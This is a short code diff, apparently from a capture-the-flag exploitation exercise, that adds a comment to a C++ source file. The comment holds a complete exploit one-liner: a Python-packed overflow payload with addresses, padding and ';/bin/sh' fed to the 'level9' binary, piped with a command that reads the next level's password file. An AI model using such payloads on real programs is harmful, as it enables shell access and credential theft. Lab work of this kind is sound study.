@@ -19,6 +19,7 @@ class N {
         int  n;
 };
 
+// (echo "cat /home/user/bonus0/.pass"; sleep 1) | /home/user/level9/level9 $(python -c "import struct;print struct.pack('<I',0xb7d86060)+'A'*104+struct.pack('<I',0x0804a00c)+';/bin/sh'")
 int main(int argc, char **argv)
 {
     N   *a;
